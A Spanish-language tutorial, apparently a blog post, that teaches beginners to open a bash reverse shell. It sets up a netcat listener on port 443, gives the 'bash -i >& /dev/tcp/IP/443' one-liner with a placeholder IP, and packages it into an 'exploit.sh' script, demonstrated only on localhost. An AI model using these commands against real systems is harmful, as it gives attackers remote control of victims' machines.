---
title: ReverseShells & Malware
published: true
---



**Hola** hoy estaremos hablando de pentesting web, hablaremos sobre:
* *Creación de `ReverseShell.`*
* *Como están compuestos los payloads exploits malware para windows.*
<br>

<p>Primero, qué es una <font color="red">ReverseShell</font>. Lo explicaré en un lenguaje brusco: una ReverseShell es aquella que te permite ejecutar comandos en una PC que no es tu dominio, es decir, una IP que es la de la víctima conectada a un host, donde el host es tu equipo y te permite ejecución remota de comandos.</p>
<p><a href="https://www.revshells.com/" target="_blanck">Creación de reverse-shell.</a></p>
<br>


<br>

<center><font color="yellow">[<font color="red">*</font>]</font><font color="green"> Empezaremos con las pruebas de ReverseShell</font></center>
<br>
<font color="white">--> los programas a utilizar para la ReverseShell es bash, netcat, si usas Linux es probable que ya los tengas instalados, 
en el caso contrario ejecuta:</font>
<br>

* Para <font color="yellow"> Linux </font>:

```bash
sudo apt-get install netcat bash -y
```

* Para <font color="yellow">arch-Linux</font>:

```bash
pacman -Sy netcat bash
```

<br>

* <p>Importante</p>


<p>Para este caso no utilizaremos sh sino que usaremos bash. Esto cambia un poco el contexto de la forma en la que se ejecuta el código, pero aun así se pueden lograr de mil formas aunque tengas una sh.</p>

<img src="screenshots/screen_bash.jpg">

<p><font color="yellow">[↑]</font> Como no estoy en la zsh entonces vamos a operar desde la terminal y luego operaremos de un script.</p>
<br>

---
<br>
<p><font color="yellow">[*]</font> Empezamos poniéndonos en escucha por el puerto 443 de netcat : </p>

```bash
nc -nvlp 443
```

<p><font color="yellow">[*]</font> Miramos que ip tenemos con el comando ifconfig :</p>
```bash
ifconfig
```
<img src="screenshots/ifconfig.jpg">

<p><font color="yellow">[↑]</font> Como pueden ver tengo la ip 127.0.0.1</p>
<br>

<p><font color="yellow">[*]</font> Ahora estando en escucha con netcat "nc -nlvp 443" en el puerto 443, vamos a entablar la conexión desde otra terminal porque la primera está siendo ocupada por netcat. Entonces recuerden ejecutar el comando <b>bash</b> antes de entablar la conexión.</p>
<br>

<p><font color="yellow">[*]</font> Para entablar la conexión hacemos el siguiente comando :</p>

```bash
bash
```
```bash
bash -i >& /dev/tcp/TU-IP/443/ 0>&1
```
<br>
<img src='screenshots/reverse.jpg'>

<p><font color="yellow">[↑]</font> Como pueden ver se me abrió un <b>ReverseShell</b> en la parte donde estaba en escucha con netcat.</p>

-------
<br>

<p><font color="yellow">[*]</font> Ahora pasaremos a desarrollar un <b>script malicioso en bash</b>, para ello aremos los mismo solo que esta vez el comando :
`bash -i >& /dev/tcp/127.0.0.1/443 0>&1` ira dentro de un script sh para ello:</p>

<br>

```bash
touch exploit.sh && echo -e "bash -i &>/dev/tcp/$(cat /etc/hosts  | grep localhost | awk "NR==1" | cut -d " " -f "1-1")/443 0>&1" >> exploit.sh && chmod +x ./exploit.sh
```

<br>

<p><font color="yellow">[*]</font> Lo que hace este comando es crear un script en bash para poder entablarme una conexión reversa. Pueden hacer <b>ls</b> y verán un archivo llamado <b>exploit.sh</b> y de paso otorgarle permiso de ejecución.</p>

No se ofusque si no entiende la anterior  linea de código simplemente lo que hace es hacer un archivo con `touch` darle permisos
de ejecución con `chmod +x exploit.sh` y agregarle el código con `>>` :

```bash
   bash -i >& /dev/tcp/127.0.0.1 0>&1
```

<br>
<ph><font color="yellow">[*]</font> Pueden hacerlo manualmente con los siguientes comandos :</ph>

```bash
touch exploit.sh
```
```bash
chmod +x exploit.sh
```
<br>

Abren el archivo creado y coloca la siguiente linea : `bash -i >& /dev/tcp/SU-IP/443 0>&1`
<br>
<p><font color="yellow">[*]</font> Una vez ya hecho el archivo, pónganse en escucha por el puerto <b>443</b> con netcat. Recuerden que con el comando <q><b>nc -nlvp 443</b></q> nos poníamos en escucha por el puerto <b>443</b>. Este puerto puede ser modificado siempre y cuando el puerto no esté en uso, y claramente en el exploit o código pongan su respectivo puerto.</p>

ﾠ
<ph><font color="yellow">[*]</font> Nos ponemos en escucha con netcat</ph>
```#!/bin/bash
nc -nlvp 443
```
<br>
<p><font color="yellow">[*]</font> Y ejecutamos el archivo creado</p>
```#!/bin/bash
./exploit.sh
```

<img src="screenshots/final.jpg">

<p><font color="yellow">[↑]</font><b> Ahora como pude ver tengo una reverse Shell</b></p>
<br>

<p><font color="yellow">[*]</font> Lo más cómodo de hacerlo por script es que se puede ejecutar el archivo teniendo la zsh y ahorrándose el comando `bash` y ejecutar el archivo. Esto se debe a la extensión <b>"sh"</b> que tiene el archivo.</p>

<br>
<p>Vale ya sabes al menos cosas básicas.</p>

